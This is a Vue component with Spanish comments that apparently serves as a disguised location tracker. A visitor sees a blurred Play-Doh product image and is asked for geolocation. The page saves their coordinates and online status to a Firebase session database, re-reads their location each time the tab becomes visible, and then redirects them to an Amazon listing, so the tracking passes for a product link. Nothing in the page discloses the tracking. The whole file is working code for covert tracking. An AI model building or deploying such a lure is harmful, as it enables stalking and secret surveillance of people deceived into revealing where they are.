<script setup>
import { ref, onMounted, onUnmounted } from 'vue';
import { useRoute } from 'vue-router';
import { db } from '../firebase/config';
import { ref as dbRef, set, onValue, serverTimestamp } from "firebase/database";

const route = useRoute();
const sessionId = route.params.sessionId;
const loading = ref(false);
const error = ref(null);
const isTracking = ref(false);
const permissionGranted = ref(false);
const showThanks = ref(false);
const backgroundBlur = ref(true);

const asciiArt = 
``;

// Guardar sesión en localStorage
const saveSession = () => {
  localStorage.setItem('tracking_session', JSON.stringify({
    sessionId,
    startTime: Date.now()
  }));
};

// Actualizar estado de conexión
const updateConnectionState = () => {
  const connectedRef = dbRef(db, `.info/connected`);
  const sessionStatusRef = dbRef(db, `sessions/${sessionId}/status`);
  
  onValue(connectedRef, (snap) => {
    if (snap.val() === true) {
      // Cuando nos desconectemos, actualizar estado
      set(sessionStatusRef, {
        online: true,
        lastSeen: serverTimestamp()
      });

      // Configurar actualización de estado al desconectarse
      set(sessionStatusRef, {
        online: false,
        lastSeen: serverTimestamp()
      }, { onDisconnect: true });
    }
  });
};

const updateLocation = () => {
  if (!sessionId) return;
  
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(
      (position) => {
        const locationData = {
          latitude: position.coords.latitude,
          longitude: position.coords.longitude,
          timestamp: Date.now()
        };

        const locationRef = dbRef(db, `sessions/${sessionId}/locations/${Date.now()}`);
        set(locationRef, locationData)
          .then(() => {
            loading.value = false;
            // Después de guardar la ubicación, mostramos el agradecimiento y redirigimos
            showThankYouAndStart();
          })
          .catch(err => {
            console.error('Error guardando ubicación:', err);
            error.value = 'Error al guardar la ubicación';
          });
      },
      (err) => {
        console.error('Error de geolocalización:', err);
        error.value = 'Error al obtener la ubicación';
      }
    );
  }
};

const stopTracking = () => {
  isTracking.value = false;
  localStorage.removeItem('tracking_session');
};

// Solicitar permiso de ubicación
const requestLocationPermission = () => {
  loading.value = true;
  
  if (navigator.geolocation) {
    navigator.permissions.query({ name: 'geolocation' }).then((result) => {
      if (result.state === 'granted') {
        permissionGranted.value = true;
        updateLocation(); // Solo llamamos a updateLocation
      } else if (result.state === 'prompt') {
        // Solicitar permiso
        navigator.geolocation.getCurrentPosition(
          () => {
            permissionGranted.value = true;
            updateLocation(); // Solo llamamos a updateLocation
          },
          (err) => {
            error.value = `Error: ${err.message}`;
            loading.value = false;
          }
        );
      } else {
        error.value = 'Acceso a ubicación denegado';
        loading.value = false;
      }
    });
  } else {
    error.value = "Geolocalización no disponible en este navegador";
    loading.value = false;
  }
};

const showThankYouAndStart = () => {
  loading.value = false;
  showThanks.value = true;
  backgroundBlur.value = false; // Quitar el desenfoque
  
  // Redirigir después de 2 segundos
  setTimeout(() => {
    window.location.href = 'https://www.amazon.com/dp/B0B2J2LGMC?ref_=cm_sw_r_cso_wa_apin_dp_F8HW55DXF9JZR0EX788S';
  }, 2000);
};

// Restaurar sesión
const restoreSession = () => {
  const savedSession = localStorage.getItem('tracking_session');
  if (savedSession) {
    const { sessionId: savedSessionId } = JSON.parse(savedSession);
    if (savedSessionId === sessionId) {
      updateLocation();
    }
  }
};

onMounted(() => {
  const sessionRef = dbRef(db, `sessions/${sessionId}`);
  onValue(sessionRef, (snapshot) => {
    const session = snapshot.val();
    if (!session || !session.active) {
      error.value = 'Sesión no válida o inactiva';
      return;
    }
    
    if (!isTracking.value && !loading.value) {
      requestLocationPermission();
    }
  });

  // Restaurar sesión si existe
  restoreSession();

  // Manejar cuando la página se vuelve visible
  document.addEventListener('visibilitychange', () => {
    if (document.visibilityState === 'visible') {
      restoreSession();
    }
  });
});

onUnmounted(() => {
});
</script>

<template>
  <div class="tracker-container" :class="{ 'background-blur': backgroundBlur }">

  </div>
</template>

<style scoped>
.tracker-container {
  max-width: 600px;
  margin: 2rem auto;
  padding: 20px;
  background-color: var(--bg-secondary);
  border-radius: 12px;
  color: var(--text-primary);
  position: relative;
  z-index: 1;
}

.tracker-container::before {
  content: '';
  position: fixed;
  top: 0;
  left: 0;
  right: 0;
  bottom: 0;
  background-image: url('../assets/PlayDohkitchencreations.png');
  background-size: cover;
  background-position: center;
  background-repeat: no-repeat;
  z-index: -1;
}

.background-blur::before {
}

.status {
  background-color: var(--card-bg);
  color: var(--text-secondary);
  padding: 1rem;
  margin: 1rem 0;
  border-radius: 8px;
  border: 1px solid var(--border-color);
}

.error {
  background-color: var(--bg-primary);
  color: var(--error);
  padding: 1rem;
  margin: 1rem 0;
  border-radius: 8px;
  border: 1px solid var(--error);
}

.tracking-active {
  background: var(--bg-secondary);
  color: var(--text-primary);
  padding: 1.5rem;
  margin: 1rem 0;
  border-radius: 8px;
  text-align: center;
  border: 1px solid var(--accent-primary);
  box-shadow: 0 0 15px rgba(0, 255, 213, 0.2);
}

.session-info {
  font-size: 0.8em;
  margin-top: 1em;
  color: var(--text-secondary);
  opacity: 0.8;
}

@keyframes pulse {
  0% {
    box-shadow: 0 0 0 0 rgba(0, 255, 213, 0.4);
  }
  70% {
    box-shadow: 0 0 0 10px rgba(0, 255, 213, 0);
  }
  100% {
    box-shadow: 0 0 0 0 rgba(0, 255, 213, 0);
  }
}

.loading-screen, .thanks-screen {
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  min-height: 300px;
  text-align: center;
  background: var(--card-bg);
  border-radius: 12px;
  padding: 2rem;
}

.loader {
  width: 50px;
  height: 50px;
  border: 4px solid var(--accent-primary);
  border-top: 4px solid transparent;
  border-radius: 50%;
  animation: spin 1s linear infinite;
  margin-bottom: 1rem;
}

.check-mark {
  font-size: 4rem;
  color: var(--success);
  animation: scale-in 0.3s ease-out;
}

@keyframes spin {
  0% { transform: rotate(0deg); }
  100% { transform: rotate(360deg); }
}

@keyframes scale-in {
  0% { transform: scale(0); }
  100% { transform: scale(1); }
}

.loading-screen h2, .thanks-screen h2 {
  color: var(--text-primary);
  margin: 1rem 0;
}

.loading-screen p, .thanks-screen p {
  color: var(--text-secondary);
  margin: 0;
}

.session-error {
  margin-top: 1rem;
  padding: 0.5rem;
  background-color: var(--bg-primary);
  border: 1px solid var(--error);
  border-radius: 4px;
  color: var(--error);
}

.ascii-art {
  font-family: monospace;
  white-space: pre;
  line-height: 1;
  font-size: 10px;
  color: var(--accent-primary);
  text-shadow: 0 0 5px var(--accent-secondary);
  margin: 0;
  padding: 0;
  overflow: hidden;
}
</style>
